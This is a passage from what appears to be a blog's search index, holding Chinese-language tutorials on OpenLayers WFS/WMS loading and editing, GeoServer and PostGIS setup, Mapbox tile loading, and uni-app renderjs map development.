} }; \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; #map{ width: 100%; height: 90vh; } /*隐藏ol的一些自带元素*/ .ol-attribution, .ol-zoom { display: none; } \u0026lt;/style\u0026gt; 2.点击wfs要素展示数据 ==使用map.forEachFeatureAtPixel==\nhtml\n1 2 3 4 \u0026lt;div id=\u0026#34;popup\u0026#34; class=\u0026#34;ol-popup\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; id=\u0026#34;popup-closer\u0026#34; class=\u0026#34;ol-popup-closer\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;div id=\u0026#34;popup-content\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 // 获取到popup的节点 var container = document.getElementById(\u0026#39;popup\u0026#39;); var content = document.getElementById(\u0026#39;popup-content\u0026#39;); var closer = document.getElementById(\u0026#39;popup-closer\u0026#39;); /** * Add a click handler to hide the popup. * @return {boolean} Don\u0026#39;t follow the href. */ closer.onclick = function () { overlay.setPosition(undefined); closer.blur(); return false; }; // 创建一个overlay, 绑定html元素container var overlay = new Overlay(/** @type {olx.OverlayOptions} */ ({ element: container, autoPan: true, autoPanAnimation: { duration: 250 } })); map.addOverlay(overlay) //点击要素获得信息 map.on(\u0026#39;singleclick\u0026#39;, function(evt) { // console.log(\u0026#34;evt:\u0026#34;,evt) // displayFeatureInfo(evt.pixel); var feature = map.forEachFeatureAtPixel(evt.pixel, function(feature) { return feature; }); console.log(\u0026#34;feature:\u0026#34;,feature) if(feature != null){ // console.log(\u0026#34;feature getId:\u0026#34;,feature.getId()) // console.log(\u0026#34;feature getKeys:\u0026#34;,feature.getKeys()) // console.log(\u0026#34;feature getProperties:\u0026#34;,feature.getProperties()) var prop = feature.getProperties(); if(feature.getId().indexOf(\u0026#34;qunaer\u0026#34;) != -1){ content.innerHTML = \u0026#39;\u0026lt;h3\u0026gt;\u0026#39; + prop.F_name + \u0026#39;\u0026lt;/h3\u0026gt;\u0026#39; + \u0026#39;\u0026lt;p style=\u0026#34;margin:10px 0\u0026#34;\u0026gt;地址:\u0026#39; + prop.address + \u0026#39;\u0026lt;/p\u0026gt;\u0026#39; + \u0026#39;\u0026lt;img src=\u0026#34;\u0026#39; + prop.picurl + \u0026#39;\u0026#34; height=\u0026#34;150px\u0026#34; /\u0026gt;\u0026#39;; } else if(feature.getId().indexOf(\u0026#34;province\u0026#34;) != -1){ content.innerHTML = \u0026#39;\u0026lt;h2\u0026gt;\u0026#39; + prop.NL_NAME_1 + \u0026#39;\u0026lt;/h2\u0026gt;\u0026#39; } // 设置overlay的位置，从而显示在鼠标点击处 overlay.setPosition(evt.coordinate); } }); css\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 .ol-popup { position: absolute; background-color: white; box-shadow: 0 1px 4px rgba(0,0,0,0.2); padding: 15px; border-radius: 10px; border: 1px solid #cccccc; bottom: 12px; left: -50px; min-width: 250px; } .ol-popup:after, .ol-popup:before { top: 100%; border: solid transparent; content: \u0026#34; \u0026#34;; height: 0; width: 0; position: absolute; pointer-events: none; } .ol-popup:after { border-top-color: white; border-width: 10px; left: 48px; margin-left: -10px; } .ol-popup:before { border-top-color: #cccccc; border-width: 11px; left: 48px; margin-left: -11px; } .ol-popup-closer { text-decoration: none; position: absolute; top: 2px; right: 8px; } .ol-popup-closer:after { content: \u0026#34;✖\u0026#34;; } 3.通过wfs修改数据 加载wfs的时候要指定geometryName\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 wfsVectorLayer = new VectorLayer({ source: new VectorSource({ format: new GeoJSON({ // 因为数据源里面字段the_geom存储的是geometry，所以需要指定 geometryName: \u0026#39;the_geom\u0026#39; }), url: \u0026#39;/api/wfs?service=WFS\u0026amp;version=1.0.0\u0026amp;request=GetFeature\u0026amp;typeName=maptest%3Anyc_roads\u0026amp;outputFormat=application%2Fjson\u0026amp;srsname=EPSG:4326\u0026#39; }), style: function(feature, resolution) { return new Style({ stroke: new Stroke({ color: \u0026#39;red\u0026#39;, width: 2 }) }); } }); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 // 保存已经编辑的要素 onSave() { if (modifiedFeatures \u0026amp;\u0026amp; modifiedFeatures.getLength() \u0026gt; 0) { console.log(\u0026#34;modifiedFeatures:\u0026#34;,modifiedFeatures) // 转换坐标 var modifiedFeature = modifiedFeatures.item(0).clone(); // 注意ID是必须，通过ID才能找到对应修改的feature modifiedFeature.setId(modifiedFeatures.item(0).getId()); // 调换经纬度坐标，以符合wfs协议中经纬度的位置 modifiedFeature.getGeometry().applyTransform(function(flatCoordinates, flatCoordinates2, stride) { for (var j = 0; j \u0026lt; flatCoordinates.length; j += stride) { var y = flatCoordinates[j]; var x = flatCoordinates[j + 1]; flatCoordinates[j] = x; flatCoordinates[j + 1] = y; } }); console.log(\u0026#34;modifyWfs:\u0026#34;,modifiedFeature) this.modifyWfs([modifiedFeature]); } }, // 把修改提交到服务器端 modifyWfs(features) { var WFSTSerializer = new WFS(); var featObject = WFSTSerializer.writeTransaction(null, features, null, { featureType: \u0026#39;nyc_roads\u0026#39;, // 注意这个值必须为创建工作区时的命名空间URI featureNS: \u0026#39;http://maptest/test1\u0026#39;, srsName: \u0026#39;EPSG:4326\u0026#39; }); // 转换为xml内容发送到服务器端 var serializer = new XMLSerializer(); var featString = serializer.serializeToString(featObject); console.log(\u0026#34;featString:\u0026#34;,featString) uni.request({ url: \u0026#39;/api/wfs?service=WFS\u0026#39;, method: \u0026#39;POST\u0026#39;, data:featString, header: { // 指定内容为xml类型 \u0026#39;Content-Type\u0026#39;: \u0026#39;text/xml\u0026#39; }, success: (res) =\u0026gt; { console.log(\u0026#34;success res:\u0026#34;,res.data); } }); } 4.加载WMS 点击wms获得信息 使用**==getFeatureInfoUrl==**\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 //加载WMS var wmsLayer = new TileLayer({ source: new TileWMS({ url: \u0026#34;/api/maptest/wms\u0026#34;, params:{ \u0026#39;LAYERS\u0026#39;: this.wmsSource, \u0026#39;TILED\u0026#39;: true }, transition: 0 //渲染时不透明度过渡的持续时间。要禁用不透明度转换 transition: 0 }) }); var view = new View({ projection: \u0026#34;EPSG:4326\u0026#34;, // center: [105, 34], center: [118.006954,25.101685], zoom: 10, maxZoom: 18, minZoom: 4, }) var map = new Map({ // layers: [tileOSM, tileLayer], layers: [tileOSM, wmsLayer, wfsVectorLayer], view: view, target: \u0026#39;map\u0026#39;, }); //点击wms获得信息 map.on(\u0026#39;singleclick\u0026#39;, function(evt) { // document.getElementById(\u0026#39;nodelist\u0026#39;).innerHTML = \u0026#34;Loading... please wait...\u0026#34;; var view = map.getView(); var viewResolution = view.getResolution(); var source = wmsLayer.getSource(); var url = source.getFeatureInfoUrl( evt.coordinate, viewResolution, view.getProjection(), { \u0026#39;INFO_FORMAT\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;FEATURE_COUNT\u0026#39;: 50 }); if (url) { // document.getElementById(\u0026#39;nodelist\u0026#39;).innerHTML = \u0026#39;\u0026lt;iframe seamless src=\u0026#34;\u0026#39; + url + \u0026#39;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;; console.log(\u0026#34;url:\u0026#34;,url) } }); ","permalink":"https://chance7bin.github.io/posts/map/openlayers%E5%8A%A0%E8%BD%BD%E5%9C%B0%E5%9B%BE%E6%9C%8D%E5%8A%A1/","summary":"1.加载在线WFS服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59","title":"openlayers加载地图服务"},{"content":"1.官网API https://openlayers.org/en/latest/apidoc/\n2.openlayers教程（花几天时间从头看到尾基本上就可以熟悉openlayers了） http://primer.openlayers.cn/ol3-primer/\n3.GeoServer安装和发布服务 https://blog.csdn.net/u010166404/article/details/51115862?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control\u0026amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control\n4.PostgreSQL 10 和postgis10下载安装 https://blog.csdn.net/qq_40323256/article/details/101699490\n5.创建空间数据库 https://blog.csdn.net/qq_35732147/article/details/85226864\n6.加载空间数据 https://blog.csdn.net/qq_35732147/article/details/85228444\n7.利用GeoWebCache实现WebGIS地形图展示的缓存优化 https://www.cnblogs.com/naaoveGIS/p/4195008.html\n","permalink":"https://chance7bin.github.io/posts/map/%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/","summary":"1.官网API https://openlayers.org/en/latest/apidoc/ 2.openlayers教程（花几天时间从头看到尾基本上就可以熟悉openlayers了） http://primer.openlayers.cn/ol3-primer/ 3.GeoServer安装和发布","title":"参考资料"},{"content":"一、GeoServer安装和发布服务 参考链接\n二、PostgreSQL 和 PostGIS安装 PostGIS要下载和PostgreSQL对应版本！！！\n1.下载安装postgreSQL 进入PostgreSQL 官网，进入下载导航，点击windows系统，或直接打开如下网址：\nhttps://www.enterprisedb.com/downloads/postgres-postgresql-downloads\n下载好后，以管理员身份运行安装包，然后指定安装路径\n然后一路next\n（注意：可能会报错，不过没关系，点击取消就行）\n在程序里找到安装的PostgreSQL 10下面的pgAdmin4运行数据库管理工具\n​\n2.下载安装postgis 可使用Application Stack Builder进行下载，但速度比较慢，而且可能会卡死无响应，因此换一种可以直接下载.exe的方法。\n下载地址：http://download.osgeo.org/postgis/windows/\n==一定一定要先选择对应的PostgreSQL版本！！！==\n注意：上面的安装路径一定要选择postgresql的安装路径！！！切记\n一路next\n重新打开pgadmin，发现出现了postgis数据库了\n三、创建空间数据库 1.打开pgAdmin4，鼠标右击数据库选项并选择新建数据库：\n2.如下图所示，填写“新建数据库”表单，然后单击“确定”：\n**3.**选择nyc这个新建的数据库，并打开它以显示对象树，将会看到public架构（schema）：\n4. 单击下面所示的SQL查询按钮（或转到工具 \u0026gt; 查询工具）。\n5.在查询文本区域中输入以下查询语句以加载PostGIS****空间扩展：\nCREATE EXTENSION postgis;\n6.单击工具栏中的执行查询按钮（或按F5）以\u0026quot;执行查询\u0026quot;。\n**7.**现在，通过运行PostGIS函数来确认是否安装了PostGIS：\nSELECT postgis_full_version();\n至此，已经成功地创建了PostGIS空间数据库！\n四、加载空间数据（记得设置SRID） 1.首先，返回到选项板，并单击PostGIS部分中的PostGIS shapefile工具，PostGIS shapefile工具将启动。\n**2.**填写PostGIS连接部分的连接详细信息，然后单击“ok”按钮。程序将测试连接并在日志窗口中报告。\n如果安装时使用默认的信息，就如下所示：\n**3.**接下来，打开“Add File”按钮并导航到数据目录文件\n4.将文件的SRID（空间参考信息）值更改为4527（数据源的空间参考信息）。请注意，架构、表名和列名已经根据shapefile文件里的信息填充。\n5.单击\u0026quot;Options\u0026ldquo;按钮查看加载选项。加载程序将使用快速“COPY（复制）\u0026ldquo;模式，并在加载数据后默认创建空间索引。\n**6.**最后，单击\u0026rdquo;Import\u0026ldquo;按钮并观察导入过程。\n**7.**加载所有文件后，打开pgAdmin可以看到表已加载到数据库中：数据库\u0026gt;mySDE\u0026gt;架构\u0026gt;public\u0026gt;数据表里。\n五、GeoServer连接PostGIS 1.打开GeoServer，点击数据存储中的新建数据源，选择PostGIS\n2.选择工作区，连接参数中输入PostgreSQL端口号、数据库、用户名、密码，最后点击保存应用\n六、mapbox加载geoserver发布的瓦片服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;MapBox加载WMS地图服务\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#39;https://api.mapbox.com/mapbox-gl-js/v0.50.0/mapbox-gl.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#39;https://api.mapbox.com/mapbox-gl-js/v0.50.0/mapbox-gl.css\u0026#39; rel=\u0026#39;stylesheet\u0026#39; /\u0026gt; \u0026lt;style\u0026gt; body { margin:0; padding:0; } #map { position:absolute; top:0; bottom:0; width:100%; } /*隐藏logo*/ .mapboxgl-ctrl.mapboxgl-ctrl-attrib{ display: none !important; } .mapboxgl-ctrl-logo{ display: none !important; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#39;map\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script \u0026gt; mapboxgl.accessToken = \u0026#39;pk.eyJ1Ijoid3lqcSIsImEiOiJjbDBnZDdwajUxMXRzM2htdWxubDh1MzJrIn0.2e2_rdU2nOUvtwltBIZtZg\u0026#39;; var map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#39;mapbox://styles/mapbox/streets-v10\u0026#39;, center: [108.438,34.431], zoom: 7 }); let wmsUrl = \u0026#34;http://localhost:8008/geoserver/mapserver/wms?service=WMS\u0026amp;version=1.1.0\u0026amp;request=GetMap\u0026amp;layers=mapserver:bus_line\u0026amp;styles=\u0026amp;bbox={bbox-epsg-3857}\u0026amp;width=256\u0026amp;height=256\u0026amp;srs=EPSG:3857\u0026amp;format=image/png\u0026amp;TRANSPARENT=TRUE\u0026#34; map.on(\u0026#34;load\u0026#34;,function () { map.addLayer({ \u0026#39;id\u0026#39;: \u0026#39;wms-test-layer\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;raster\u0026#39;, \u0026#39;source\u0026#39;: { \u0026#39;type\u0026#39;: \u0026#39;raster\u0026#39;, \u0026#39;tiles\u0026#39;: [ wmsUrl ], \u0026#39;tileSize\u0026#39;: 256 }, \u0026#39;paint\u0026#39;: {} }); }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 注意\nEPSG要设置为3857而不是4326，不然会出现跨域问题\n","permalink":"https://chance7bin.github.io/posts/map/geoserver%E8%BF%9E%E6%8E%A5postgis%E5%8F%91%E5%B8%83%E5%9C%B0%E5%9B%BE%E6%9C%8D%E5%8A%A1/","summary":"一、GeoServer安装和发布服务 参考链接 二、PostgreSQL 和 PostGIS安装 PostGIS要下载和PostgreSQL对应版本！","title":"geoserver连接postgis发布地图服务"},{"content":"renderjs是uni-app中一个运行在视图层的JS。可在App端和H5页面上运行。renderjs的主要作用有2个：\n（1）极大地减少了逻辑层（service）和视图层（view）的通讯损耗，提供高性能视图交互能力。纵然逻辑层和视图层分离的好处不容忽视，但例如Android端和小程序的高性能应用制作造成两层之间的通信阻塞迫使我们不得不放弃采用这种技术。由于renderjs运行在视图层，可以直接操作视图层的元素，因此可避免通信折损。\n（2）在视图层操作DOM，运行for web的JS库。官方文档中不建议在uni-app里操作DOM，但可使用renderjs来操作一些dom、window的库。原因在于在app-vue环境下，视图层由webview渲染，而renderjs运行在视图层，可以很方便地操作dom和window。\n移动端使用OpenLayers等开源GIS地图库最大的困难在于，若是没有提供相应的SDK将很难进行移动App的开发。由于uni-app不支持操作DOM元素，使得众多开源GIS地图库在开发移动应用时被舍弃。\n如今，有了renderjs技术后，可直接在视图层操作DOM元素，让开发者可以像开发WebGIS一样开发移动端GIS，这极大地降低了开发难度，开发者只需掌握Vue框架的核心内容，而无需掌握Android及IOS的开发技术便可实现移动GIS应用的大部分功能。\n如下为renderjs的使用方式，openlayers的写法跟开发WebGIS相同，写在script中\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script module=\u0026#34;test\u0026#34; lang=\u0026#34;renderjs\u0026#34;\u0026gt; export default { mounted() { // ... }, methods: { // ... } } \u0026lt;/script\u0026gt; 当项目代码越来越多的时候，对代码进行组件化是必须的，网上针对renderjs组件之间通信的资料还比较少，官网给了一个较为简单的示例。\nhttps://ext.dcloud.net.cn/plugin?id=1207\n但是在实际开发中通信时遇到的一些情况网上并没有相关解答，所以我在这里做了总结并给出了相应的解决方案，供大家参考。\n1 renderjs通信示例及解析 HTML\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;!-- 顶部导航栏 --\u0026gt; \u0026lt;view class=\u0026#34;top-nav\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;ol.queryFeature\u0026#34;\u0026gt;查询\u0026lt;/button\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;!-- 查询菜单 --\u0026gt; \u0026lt;view class=\u0026#34;side-menu\u0026#34;\u0026gt; \u0026lt;scroll-view class=\u0026#34;feature-list\u0026#34; scroll-x=\u0026#34;true\u0026#34; scroll-y=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;!-- 监听selectedFeature的变化,把变化传给视图层 --\u0026gt; \u0026lt;view :prop=\u0026#34;selectedFeature\u0026#34; :change:prop=\u0026#34;ol.toFeature\u0026#34;\u0026gt;\u0026lt;/view\u0026gt; \u0026lt;view class=\u0026#34;feature-list-view\u0026#34; @click=\u0026#34;showFeature(item)\u0026#34; v-for=\u0026#34;(item, index) in searchList\u0026#34; :key=\u0026#34;index\u0026#34; \u0026gt; \u0026lt;view class=\u0026#34;list-title\u0026#34;\u0026gt;{{item.values_.objectid}}\u0026lt;/view\u0026gt; \u0026lt;view class=\u0026#34;list-item\u0026#34;\u0026gt;{{item.values_.zt}}\u0026lt;/view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/scroll-view\u0026gt; \u0026lt;/view\u0026gt; js （逻辑层）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;script\u0026gt; export default { data() { return { selectedFeature:{} } }, methods: { //接受视图层传过来的信息 setSearchList(e){ console.log(\u0026#34;option:\u0026#34;,e) this.searchList = e.option }, showFeature(item){ console.log(\u0026#34;show feature:\u0026#34;,item); this.selectedFeature = item; } } } \u0026lt;/script\u0026gt; renderjs（视图层）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;script module=\u0026#34;ol\u0026#34; lang=\u0026#34;renderjs\u0026#34;\u0026gt; export default { data() { return { selectedFeature:{} } }, methods: { queryFeature(event, ownerInstance){ ... // 调用 service 层的方法 ownerInstance.callMethod(\u0026#39;setSearchList\u0026#39;, { option: features }) ... }, toFeature(newValue, oldValue, ownerInstance, instance){ ... console.log(\u0026#34;newValue:\u0026#34;,newValue.values_.objectid) ... } } } \u0026lt;/script\u0026gt; （1）逻辑层到视图层的通信\n在html中写一个监听属性变化的监听器：\n1 \u0026lt;view :prop=\u0026#34;selectedFeature\u0026#34; :change:prop=\u0026#34;ol.toFeature\u0026#34;\u0026gt;\u0026lt;/view\u0026gt; 当点击结果列表中的某一项时，触发点击事件showFeature，执行逻辑层代码this.selectedFeature = item；此时selectedFeature的值发生了变化，从而触发监听selectedFeature的视图层事件ol.toFeature，在监听逻辑层属性变化的视图层函数中有几个参数：newValue、oldValue、ownerInstance、instance，其中的newValue即为改变后的属性值。此即逻辑层向视图层的通信。\n（2）视图层到逻辑层的通信\n首先在HTML中绑定视图层的函数ol.queryFeature，该函数有两个参数event和ownerInstance，使用ownerInstance的callMethod方法可调用逻辑层的方法setSearchList，callMethod的第二个参数为一个对象，逻辑层中setSearchList函数的形参便是视图层传递过来的值。此即视图层向逻辑层的通信。\n2 renderjs通信注意事项 （1）子组件通过事件向上传递值给父组件时，不能直接传值到视图层（renderjs模块），只能传值给逻辑层，因此需在逻辑层监听值的变化来触发视图层中的方法来执行事件或者改变视图层中的变量。\n（2）子组件中不可以通过事件向上传递，在父组件的逻辑层绑定视图层的方法进行调用。一种解决思路是在逻辑层添加一个触发视图层方法的触发器，在Vuex中监听该触发器属性的状态，逻辑层监听到触发器状态变化后便会调用视图层的方法。\n","permalink":"https://chance7bin.github.io/posts/map/uniapp%E5%8A%A0%E8%BD%BDopenlayers%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E7%AF%87/","summary":"renderjs是uni-app中一个运行在视图层的JS。可在App端和H5页面上运行。renderjs的主要作用有2个： （1）极大地减少了","title":"uniapp加载openlayers——组件通信篇"},{"content":" uniapp中的APP开发使用开源地图的困难之处在于的APP端不支持document、window等对象的API，而开源地图的实例化又是需要通过dom获取到节点进行地图的创建，因此正常的uniapp开发是无法使用开源地图的，需要另辟蹊径。\n查阅相关资料，列举出了以下几种来解决移动端使用开源地图开发的方法，并就其使用方法以及可行性进行说明。\n==uni-app 中，没有 document！！！==\n方式一 使用uniapp中的renderjs进行开发\nhttps://uniapp.dcloud.net.cn/frame?id=renderjs\nrenderjs是一个运行在视图层的js。它比WXS更加强大。它只支持app-vue和h5。\n（WXS是一套运行在视图层的脚本语言，它的特点是运行在视图层。当需要避免逻辑层和渲染层交互通信折损时，可采用wxs。uni-app可以将wxs代码编译到微信小程序、QQ小程序、app-vue、H5上）\nrenderjs的主要作用有2个：\n大幅降低逻辑层和视图层的通讯损耗，提供高性能视图交互能力 在视图层操作dom，运行for web的js库 功能详解\n大幅降低逻辑层和视图层的通讯损耗，提供高性能视图交互能力 逻辑层和视图层分离有很多好处，但也有一个副作用是在造成了两层之间通信阻塞。尤其是小程序和App的Android端阻塞问题影响了高性能应用的制作。\nrenderjs运行在视图层，可以直接操作视图层的元素，避免通信折损。\n在视图层操作dom，运行for web的js库 官方不建议在uni-app里操作dom，但如果你不开发小程序，想使用一些操作了dom、window的库，其实可以使用renderjs来解决。 在app-vue环境下，视图层由webview渲染，而renderjs运行在视图层，自然可以操作dom和window。\n使用方法\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script module=\u0026#34;test\u0026#34; lang=\u0026#34;renderjs\u0026#34;\u0026gt; export default { mounted() { // ... }, methods: { // ... } } \u0026lt;/script\u0026gt; 方式二（不建议） 用 html 5+ 或者 web-view内嵌h5去实现地图\n地图为单独的一个webview界面\nApp端的webview是非常强大的，可以更灵活的控制和拥有更丰富的API。\n数据目录那一块的功能要在内嵌的html上写 或者在uniapp弄一个侧边栏\n方式三（不建议） 由于目前市面上的app大部分是由原生和H5独立或混合编写，可对原生项目进行改造，实现原生(Android)和uni-app以及html5项目混编，使其能在iOS、Android、H5、小程序等多个平台运行，从而实现跨平台开发。\n第一种实现方式：在uni-app宿主项目中添加原生以及H5插件模块\n第二种实现方式：在原生宿主项目中运行uni-app以及H5插件模块\n","permalink":"https://chance7bin.github.io/posts/map/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%9A%84%E5%9C%B0%E5%9B%BE%E5%BC%80%E5%8F%91/","summary":"uniapp中的APP开发使用开源地图的困难之处在于的APP端不支持document、window等对象的API，而开源地图的实例化又是需要","title":"移动端的地图开发"},{"content":"要素的查询、通过geserver进行的增删改 都是用到下图这个api，很重要！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 queryFeature(){ //首先定义一个空的矢量图层，设置样式并添加到当前map中 var vectorSource = new VectorSource(); //设置查询参数与条件 var featureRequest = new WFS().writeGetFeature({ srsName: \u0026#39;EPSG:4326\u0026#39;,//坐标系统 featureNS: \u0026#39;http://onemap/ns\u0026#39;,//命名空间 URI featurePrefix: \u0026#39;onemap\u0026#39;,//工作区名称 featureTypes: [this.wfsSource],//查询图层，可以是同一个工作区下多个图层，逗号隔开 maxFeatures: 5000, outputFormat: \u0026#39;application/json\u0026#39;, filter: new like(\u0026#39;objectid\u0026#39;,\u0026#39;254*\u0026#39;)//前者是属性名，后者是对应值 }); fetch(api.domain + \u0026#39;/geoserver/\u0026#39; + \u0026#39;/onemap/ows?service=WFS\u0026#39;, {//geoserver wfs地址如localhost:8080/geoserver/wfs，我是8081 method: \u0026#39;POST\u0026#39;, body: new XMLSerializer().serializeToString(featureRequest) }).then(function(response) { return response.json(); }).then(function(json) { console.log(\u0026#34;feature json:\u0026#34;,json); }); } 上述代码进行模糊查询一直报错？？\nUncaught (in promise) SyntaxError: Unexpected token \u0026lt; in JSON at position 0 at __uniappview.html:0\nfetch的url写错了 ， 请求的地址和请求wfs资源的一样就不会报错\n1 api.domain + \u0026#39;/geoserver/onemap/ows?service=WFS\u0026amp;version=1.0.0\u0026amp;request=GetFeature\u0026amp;typeName=\u0026#39; + this.wfsSource + \u0026#39;\u0026amp;outputFormat=application%2Fjson\u0026amp;srsname=EPSG:4326\u0026#39; 注意： like 只可以对字符串属性进行模糊查找， 整型不可以\n","permalink":"https://chance7bin.github.io/posts/map/openlayers%E5%AF%B9%E8%A6%81%E7%B4%A0%E6%9C%8D%E5%8A%A1%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/","summary":"要素的查询、通过geserver进行的增删改 都是用到下图这个api，很重要！ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 queryFeature(){ //首先定义一","title":"openlayers对要素服务的增删改查"}]